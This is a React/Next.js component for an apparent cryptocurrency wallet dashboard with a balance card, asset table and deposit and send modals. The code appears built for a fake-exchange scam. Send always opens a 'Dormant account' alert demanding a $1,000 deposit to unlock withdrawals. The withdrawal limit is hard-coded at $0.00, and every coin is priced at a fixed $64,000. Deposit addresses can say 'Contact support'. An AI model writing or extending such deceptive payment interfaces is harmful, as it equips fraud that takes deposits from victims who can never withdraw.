"use client";
import { useState } from "react";
import { Eye, EyeOff, ArrowDown, Send, CreditCard, X, ShieldAlert, Lock, Copy } from "lucide-react";
import PortfolioChart from "@/components/PortfolioChart";

export default function DashboardClient({ assets, totalBalance }: any) {
  const [showBalance, setShowBalance] = useState(true);
  const [selectedAsset, setSelectedAsset] = useState<any>(null); // For Receive
  const [showDormantModal, setShowDormantModal] = useState(false); // For Send Restriction

  // Logic to pin Bitcoin first, then sort by value
  const sortedAssets = [...assets].sort((a, b) => {
    if (a.symbol === "BTC") return -1;
    if (b.symbol === "BTC") return 1;
    return b.amount - a.amount; // Then sort by highest balance
  });

  return (
    <div className="space-y-6">
      
      {/* --- Top Section: Balance & Actions --- */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 bg-slate-900 border border-slate-800 p-8 rounded-3xl relative overflow-hidden shadow-2xl">
          <div className="flex justify-between items-start z-10 relative">
            <div>
              <p className="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Total Portfolio Balance</p>
              <h2 className={`text-4xl md:text-5xl font-mono tracking-tighter text-white ${!showBalance && 'blur-lg'}`}>
                ${totalBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
              </h2>
              <div className="mt-6 flex flex-wrap gap-3">
                <ActionButton icon={<ArrowDown size={16} />} label="Receive" onClick={() => setSelectedAsset(sortedAssets[0])} />
                
                {/* The "Send" Button triggers the Dormant Alert */}
                <ActionButton icon={<Send size={16} />} label="Send" onClick={() => setShowDormantModal(true)} />
                
                <ActionButton icon={<CreditCard size={16} />} label="Buy / Sell" primary />
              </div>
            </div>
            <button onClick={() => setShowBalance(!showBalance)} className="text-slate-500 hover:text-white bg-slate-800 p-2 rounded-lg transition-colors">
               {showBalance ? <Eye size={18} /> : <EyeOff size={18} />}
            </button>
          </div>
          <div className={`mt-4 h-48 ${!showBalance && 'blur-md'}`}>
             <PortfolioChart />
          </div>
        </div>

        {/* Right: Security Status Card */}
        <div className="bg-slate-900 border border-slate-800 p-6 rounded-3xl flex flex-col justify-between">
           <div>
             <div className="flex items-center gap-2 mb-4">
               <ShieldAlert className="text-emerald-500" size={20} />
               <h3 className="font-bold text-white">Vault Status</h3>
             </div>
             <div className="space-y-4">
               <StatusRow label="Account Level" value="Standard" />
               <StatusRow label="Withdrawal Limit" value="$0.00 / Day" red />
               <StatusRow label="Verification" value="Pending Deposit" red />
             </div>
           </div>
           <div className="mt-6 bg-emerald-500/10 p-3 rounded-xl border border-emerald-500/20 text-xs text-emerald-400 leading-relaxed">
             <span className="font-bold">Note:</span> Your account is currently in <span className="font-bold">Safe Mode</span>. Incoming transactions are active, but outgoing transfers are paused.
           </div>
        </div>
      </div>

      {/* --- Asset Table (Binance Style) --- */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-xl">
        <div className="p-4 border-b border-slate-800 flex justify-between items-center bg-slate-950/50">
          <h3 className="font-bold text-white text-sm uppercase tracking-wider">Market / Assets</h3>
        </div>
        
        <div className="overflow-x-auto">
          <table className="w-full text-left">
            <thead className="bg-slate-950 text-[10px] uppercase text-slate-500 font-bold tracking-wider">
              <tr>
                <th className="px-6 py-4">Coin</th>
                <th className="px-6 py-4 text-right">Balance</th>
                <th className="px-6 py-4 text-right">Value (USD)</th>
                <th className="px-6 py-4 text-right">Trade</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800">
              {sortedAssets.map((asset: any) => (
                <tr key={asset.id} className="hover:bg-slate-800/50 transition-colors group">
                  <td className="px-6 py-4">
                    <div className="flex items-center gap-3">
                      {/* Dynamic Icon Colors */}
                      <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold text-slate-950 text-xs ${
                        asset.symbol === 'BTC' ? 'bg-orange-500' :
                        asset.symbol === 'ETH' ? 'bg-blue-500' :
                        asset.symbol === 'USDT' ? 'bg-green-500' :
                        'bg-slate-700 text-white'
                      }`}>
                        {asset.symbol[0]}
                      </div>
                      <div>
                        <div className="font-bold text-white text-sm">{asset.name}</div>
                        <div className="text-[10px] text-slate-500 font-bold">{asset.symbol}</div>
                      </div>
                    </div>
                  </td>
                  <td className="px-6 py-4 text-right font-mono text-white text-sm">
                    {asset.amount.toFixed(4)}
                  </td>
                  <td className="px-6 py-4 text-right font-mono text-slate-400 text-sm">
                    ${(asset.amount * 64000).toLocaleString()} 
                  </td>
                  <td className="px-6 py-4 text-right">
                    <button onClick={() => setSelectedAsset(asset)} className="text-xs font-bold text-emerald-500 hover:text-emerald-400 underline decoration-dotted">
                      Deposit
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* --- MODAL 1: Receive (Deposit) --- */}
      {selectedAsset && (
        <Modal onClose={() => setSelectedAsset(null)}>
          <div className="text-center mb-6">
            <div className="w-12 h-12 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto mb-3 text-emerald-500">
              <ArrowDown size={24} />
            </div>
            <h3 className="text-xl font-bold text-white">Deposit {selectedAsset.name}</h3>
            <p className="text-xs text-slate-400 mt-1">Scan QR or copy address below</p>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 mb-6 relative group">
            <p className="text-[9px] uppercase font-bold text-slate-500 mb-2">Network: {selectedAsset.name} (Native)</p>
            <div className="flex items-center justify-between gap-2">
              <code className="text-emerald-400 font-mono text-xs break-all">
                {selectedAsset.walletAddress || "Generating address..."}
              </code>
              <button className="text-slate-500 hover:text-white transition-colors" title="Copy">
                <Copy size={16} />
              </button>
            </div>
            {!selectedAsset.walletAddress && (
              <div className="absolute inset-0 bg-slate-900/80 backdrop-blur-[1px] flex items-center justify-center text-xs text-slate-300">
                Contact support to generate address
              </div>
            )}
          </div>
        </Modal>
      )}

      {/* --- MODAL 2: Dormant Account Alert (Send Restriction) --- */}
      {showDormantModal && (
        <Modal onClose={() => setShowDormantModal(false)}>
          <div className="text-center">
            <div className="w-14 h-14 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-4 text-red-500 animate-pulse">
              <Lock size={28} />
            </div>
            <h3 className="text-xl font-bold text-white mb-2">Action Required</h3>
            <p className="text-sm text-slate-300 leading-relaxed mb-6">
              This account is currently marked as <span className="text-red-400 font-bold">Dormant</span> due to inactivity. 
              Outgoing transactions are restricted.
            </p>
            
            <div className="bg-slate-950 p-4 rounded-xl border border-red-500/20 mb-6 text-left">
              <p className="text-xs text-slate-500 uppercase font-bold mb-2">Activation Requirement</p>
              <div className="flex justify-between items-center">
                 <span className="text-sm text-white">Required Deposit:</span>
                 <span className="text-emerald-500 font-mono font-bold">$1,000.00 USD</span>
              </div>
            </div>

            <button 
              onClick={() => { setShowDormantModal(false); setSelectedAsset(sortedAssets[0]); }}
              className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold py-3 rounded-xl transition-colors shadow-lg shadow-emerald-500/20"
            >
              Deposit Funds Now
            </button>
          </div>
        </Modal>
      )}

    </div>
  );
}

// --- Reusable Components ---
function ActionButton({ icon, label, primary, onClick }: any) {
  return (
    <button onClick={onClick} className={`flex items-center gap-2 px-5 py-2.5 rounded-full font-bold text-xs transition-all ${primary ? "bg-emerald-500 text-slate-950 hover:bg-emerald-400 shadow-lg shadow-emerald-500/20" : "bg-slate-800 text-white hover:bg-slate-700"}`}>
      {icon} {label}
    </button>
  );
}

function StatusRow({ label, value, red }: any) {
  return (
    <div className="flex justify-between items-center text-sm border-b border-slate-800/50 pb-2 last:border-0 last:pb-0">
      <span className="text-slate-400">{label}</span>
      <span className={`font-mono font-bold ${red ? 'text-red-400' : 'text-emerald-400'}`}>{value}</span>
    </div>
  );
}

function Modal({ children, onClose }: any) {
  return (
    <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-center justify-center p-4" onClick={onClose}>
      <div className="bg-slate-900 border border-slate-700 rounded-2xl w-full max-w-sm p-6 shadow-2xl relative animate-in fade-in zoom-in duration-200" onClick={(e) => e.stopPropagation()}>
        <button onClick={onClose} className="absolute top-4 right-4 text-slate-500 hover:text-white transition-colors">
          <X size={20} />
        </button>
        {children}
      </div>
    </div>
  );
}